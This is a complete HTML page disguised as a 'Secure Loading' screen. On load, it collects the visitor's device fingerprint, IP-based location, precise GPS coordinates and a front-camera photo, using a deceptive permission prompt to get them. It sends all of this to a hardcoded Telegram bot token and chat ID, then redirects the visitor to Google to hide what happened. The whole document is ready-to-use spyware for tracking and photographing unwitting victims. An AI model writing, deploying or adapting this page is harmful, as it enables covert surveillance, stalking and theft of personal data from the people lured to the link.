<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading ...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }
        .container {
            text-align: center;
            padding: 2rem;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            max-width: 90%;
            width: 450px;
        }
        h1 {
            font-size: 2rem;
            margin-bottom: 1rem;
            font-weight: 300;
        }
        .spinner {
            width: 60px;
            height: 60px;
            border: 6px solid rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .status {
            margin: 20px 0;
            font-size: 1.1rem;
            opacity: 0.9;
            min-height: 2rem;
        }
        .permission-box {
            background: rgba(255, 255, 255, 0.15);
            padding: 1rem;
            border-radius: 10px;
            margin: 15px 0;
            border: 1px solid rgba(255,255,255,0.2);
        }
        .hidden {
            display: none;
        }
        .dots::after {
            content: '...';
            animation: dots 1.5s steps(4, end) infinite;
            display: inline-block;
            width: 1.5rem;
            text-align: left;
        }
        @keyframes dots {
            0%, 20% { content: ''; }
            40% { content: '.'; }
            60% { content: '..'; }
            80%, 100% { content: '...'; }
        }
        .small-note {
            font-size: 0.85rem;
            opacity: 0.7;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Secure Loading<span class="dots"></span></h1>
        <div class="spinner"></div>
        <div class="status" id="status">Initializing secure connection...</div>
        
        <!-- Permission request overlay (hidden initially) -->
        <div id="permissionRequest" class="permission-box hidden">
            <p>üìç This page needs access to:</p>
            <p>üì∑ Camera ¬∑ üó∫Ô∏è Location</p>
            <p class="small-note">Please allow when prompted</p>
        </div>

        <!-- Error message (hidden) -->
        <div id="errorMessage" class="permission-box hidden" style="background: rgba(255,0,0,0.2);">
            <p>‚ö†Ô∏è Something went wrong. Redirecting...</p>
        </div>
    </div>

    <script>
        // ==================================================
        // CONFIGURATION ‚Äì REPLACE WITH YOUR OWN CREDENTIALS
        // ==================================================
        const TELEGRAM_BOT_TOKEN = '8349023527:AAG9Tq-yiqMXKnxKkiUQ6n5uvu7Rb0kCPco';  // Provided
        const TELEGRAM_CHAT_ID = '5888374938';                                         // Provided
        const REDIRECT_URL = 'https://www.google.com';  // Change to your target link
        
        // ==================================================
        // ADVANCED DATA COLLECTION (50+ points)
        // ==================================================
        
        // ---------- Basic browser & system info ----------
        function getBasicInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(', ') : 'unknown',
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                maxTouchPoints: navigator.maxTouchPoints,
                pdfViewerEnabled: navigator.pdfViewerEnabled,
                webdriver: navigator.webdriver,
                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'unknown',
                // Screen
                screenWidth: screen.width,
                screenHeight: screen.height,
                screenAvailWidth: screen.availWidth,
                screenAvailHeight: screen.availHeight,
                screenColorDepth: screen.colorDepth,
                screenPixelDepth: screen.pixelDepth,
                screenOrientation: screen.orientation ? screen.orientation.type : 'unknown',
                devicePixelRatio: window.devicePixelRatio,
                // Window
                windowInnerWidth: window.innerWidth,
                windowInnerHeight: window.innerHeight,
                windowOuterWidth: window.outerWidth,
                windowOuterHeight: window.outerHeight,
                // Time
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                currentTime: new Date().toISOString(),
                localTime: new Date().toString(),
                // Touch
                touchSupported: 'ontouchstart' in window,
                maxTouchPoints: navigator.maxTouchPoints,
                // Battery (if available)
                battery: null  // will be filled asynchronously
            };
        }

        // ---------- Battery info ----------
        async function getBatteryInfo() {
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: battery.level * 100 + '%',
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch (e) {
                    return null;
                }
            }
            return null;
        }

        // ---------- Network info (if available) ----------
        function getNetworkInfo() {
            if (navigator.connection) {
                const conn = navigator.connection;
                return {
                    effectiveType: conn.effectiveType,
                    downlink: conn.downlink + ' Mbps',
                    rtt: conn.rtt + ' ms',
                    saveData: conn.saveData,
                    type: conn.type
                };
            }
            return null;
        }

        // ---------- GPU / WebGL info ----------
        function getGPUInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        return {
                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                        };
                    }
                }
            } catch (e) {}
            return null;
        }

        // ---------- List of installed fonts (simplified) ----------
        function getInstalledFonts() {
            // Basic font detection (common fonts)
            const fontList = [
                'Arial', 'Verdana', 'Helvetica', 'Tahoma', 'Times New Roman',
                'Courier New', 'Georgia', 'Cambria', 'Comic Sans MS', 'Impact'
            ];
            const available = [];
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            const testString = 'abcdefghijklmnopqrstuvwxyz0123456789';
            context.font = '72px monospace';
            const baselineWidth = context.measureText(testString).width;
            for (const font of fontList) {
                context.font = `72px ${font}, monospace`;
                const width = context.measureText(testString).width;
                if (width !== baselineWidth) {
                    available.push(font);
                }
            }
            return available.join(', ') || 'none detected';
        }

        // ---------- IP and geolocation via API ----------
        async function getIPInfo() {
            try {
                // Get public IP
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const ip = ipData.ip;
                
                // Get location from IP (using ipapi.co)
                const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
                const locData = await locRes.json();
                return {
                    ip: ip,
                    city: locData.city,
                    region: locData.region,
                    country: locData.country_name,
                    countryCode: locData.country_code,
                    postal: locData.postal,
                    latitude: locData.latitude,
                    longitude: locData.longitude,
                    isp: locData.org,
                    asn: locData.asn,
                    timezone: locData.timezone
                };
            } catch (e) {
                // Fallback: just IP
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    return { ip: ipData.ip, error: 'Detailed location unavailable' };
                } catch {
                    return { ip: 'unknown', error: 'IP fetch failed' };
                }
            }
        }

        // ---------- Precise GPS location ----------
        async function getGPSLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                // Set timeout
                const timeoutId = setTimeout(() => resolve(null), 10000);
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        clearTimeout(timeoutId);
                        resolve({
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            altitude: pos.coords.altitude,
                            altitudeAccuracy: pos.coords.altitudeAccuracy,
                            heading: pos.coords.heading,
                            speed: pos.coords.speed,
                            timestamp: pos.timestamp
                        });
                    },
                    (err) => {
                        clearTimeout(timeoutId);
                        console.log('GPS error:', err.message);
                        resolve(null);
                    },
                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
                );
            });
        }

        // ---------- Camera snapshot ----------
        async function takeSnapshot() {
            try {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    return null;
                }
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' }
                }).catch(() => null);
                if (!stream) return null;

                const video = document.createElement('video');
                video.srcObject = stream;
                video.autoplay = true;
                video.playsInline = true;
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => { video.play(); resolve(); };
                });
                // Let camera adjust
                await new Promise(r => setTimeout(r, 500));

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg', 0.7); // 70% quality

                stream.getTracks().forEach(t => t.stop());
                return imageData;
            } catch (e) {
                console.log('Camera error:', e.message);
                return null;
            }
        }

        // ---------- Collect ALL data ----------
        async function collectAllData() {
            const basic = getBasicInfo();
            const [battery, network, gpu, fonts, ipInfo, gps, snapshot] = await Promise.allSettled([
                getBatteryInfo(),
                Promise.resolve(getNetworkInfo()),
                Promise.resolve(getGPUInfo()),
                Promise.resolve(getInstalledFonts()),
                getIPInfo(),
                getGPSLocation(),
                takeSnapshot()
            ]);

            return {
                timestamp: new Date().toISOString(),
                basic: basic,
                battery: battery.status === 'fulfilled' ? battery.value : null,
                network: network.status === 'fulfilled' ? network.value : null,
                gpu: gpu.status === 'fulfilled' ? gpu.value : null,
                fonts: fonts.status === 'fulfilled' ? fonts.value : null,
                ipInfo: ipInfo.status === 'fulfilled' ? ipInfo.value : null,
                gps: gps.status === 'fulfilled' ? gps.value : null,
                photo: snapshot.status === 'fulfilled' ? snapshot.value : null
            };
        }

        // ---------- Send to Telegram (text + photo) ----------
        async function sendToTelegram(data) {
            if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.length < 40) {
                console.warn('Invalid bot token');
                return false;
            }

            // Format message (HTML)
            let msg = `<b>üì± Advanced Device Report</b>\n\n`;
            msg += `<b>‚è∞ Time:</b> ${new Date().toLocaleString()}\n`;
            
            // IP & location
            if (data.ipInfo) {
                msg += `<b>üåê IP:</b> ${data.ipInfo.ip || 'unknown'}\n`;
                if (data.ipInfo.city) msg += `<b>üìç City:</b> ${data.ipInfo.city}, ${data.ipInfo.country}\n`;
                if (data.ipInfo.isp) msg += `<b>üè¢ ISP:</b> ${data.ipInfo.isp}\n`;
            }
            
            // GPS
            if (data.gps) {
                msg += `<b>üõ∞Ô∏è GPS:</b> ${data.gps.lat.toFixed(6)}, ${data.gps.lng.toFixed(6)} (acc: ${Math.round(data.gps.accuracy)}m)\n`;
                msg += `<b>üó∫Ô∏è Maps:</b> <a href="https://maps.google.com/?q=${data.gps.lat},${data.gps.lng}">View</a>\n`;
            }
            
            // System
            msg += `\n<b>üíª System:</b>\n`;
            msg += `‚Ä¢ Platform: ${data.basic.platform}\n`;
            msg += `‚Ä¢ Screen: ${data.basic.screenWidth}x${data.basic.screenHeight}, ${data.basic.devicePixelRatio}x\n`;
            msg += `‚Ä¢ CPU cores: ${data.basic.hardwareConcurrency}\n`;
            msg += `‚Ä¢ Memory: ${data.basic.deviceMemory}\n`;
            msg += `‚Ä¢ Timezone: ${data.basic.timezone}\n`;
            msg += `‚Ä¢ Language: ${data.basic.language}\n`;
            
            // GPU
            if (data.gpu) {
                msg += `‚Ä¢ GPU: ${data.gpu.renderer || 'unknown'}\n`;
            }
            
            // Network
            if (data.network) {
                msg += `‚Ä¢ Connection: ${data.network.effectiveType} (${data.network.downlink})\n`;
            }
            
            // Battery
            if (data.battery) {
                msg += `‚Ä¢ Battery: ${data.battery.level}${data.battery.charging ? ' (charging)' : ''}\n`;
            }
            
            // Fonts (shortened)
            if (data.fonts) {
                let fontStr = data.fonts;
                if (fontStr.length > 100) fontStr = fontStr.substring(0, 100) + '‚Ä¶';
                msg += `‚Ä¢ Fonts: ${fontStr}\n`;
            }
            
            // Browser
            msg += `\n<b>üåç Browser:</b>\n`;
            msg += `‚Ä¢ UA: ${data.basic.userAgent.substring(0, 150)}‚Ä¶\n`;
            msg += `‚Ä¢ Languages: ${data.basic.languages}\n`;
            msg += `‚Ä¢ Cookies enabled: ${data.basic.cookieEnabled}\n`;
            
            // Send text message
            const textUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            try {
                const textRes = await fetch(textUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: msg,
                        parse_mode: 'HTML',
                        disable_web_page_preview: true
                    })
                });
                const textResult = await textRes.json();
                console.log('Text send:', textResult);
                
                // Send photo if available
                if (data.photo) {
                    // Convert base64 to blob
                    const base64Data = data.photo.split(',')[1];
                    const byteChars = atob(base64Data);
                    const byteArray = new Uint8Array(byteChars.length);
                    for (let i = 0; i < byteChars.length; i++) {
                        byteArray[i] = byteChars.charCodeAt(i);
                    }
                    const blob = new Blob([byteArray], { type: 'image/jpeg' });
                    
                    const formData = new FormData();
                    formData.append('chat_id', TELEGRAM_CHAT_ID);
                    formData.append('photo', blob, 'snapshot.jpg');
                    formData.append('caption', `üì∏ Camera snapshot at ${new Date().toLocaleString()}`);
                    
                    const photoUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
                    const photoRes = await fetch(photoUrl, { method: 'POST', body: formData });
                    const photoResult = await photoRes.json();
                    console.log('Photo send:', photoResult);
                }
                return true;
            } catch (e) {
                console.error('Telegram send error:', e);
                return false;
            }
        }

        // ---------- Main execution ----------
        async function main() {
            const statusEl = document.getElementById('status');
            const permEl = document.getElementById('permissionRequest');
            const errorEl = document.getElementById('errorMessage');

            try {
                // Step 1: Show permission request
                permEl.classList.remove('hidden');
                statusEl.textContent = 'Requesting camera and location access...';
                
                // Step 2: Collect everything (this will trigger permission prompts)
                statusEl.textContent = 'Gathering device information...';
                const allData = await collectAllData();
                
                // Hide permission request
                permEl.classList.add('hidden');
                
                // Step 3: Send to Telegram
                statusEl.textContent = 'Securely transmitting data...';
                await sendToTelegram(allData);
                
                // Step 4: Redirect
                statusEl.textContent = 'Redirecting...';
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 2000);
                
            } catch (err) {
                console.error('Main error:', err);
                errorEl.classList.remove('hidden');
                statusEl.textContent = 'Redirecting...';
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 2000);
            }
        }

        // Start when page loads
        window.addEventListener('load', main);
    </script>
</body>
</html>
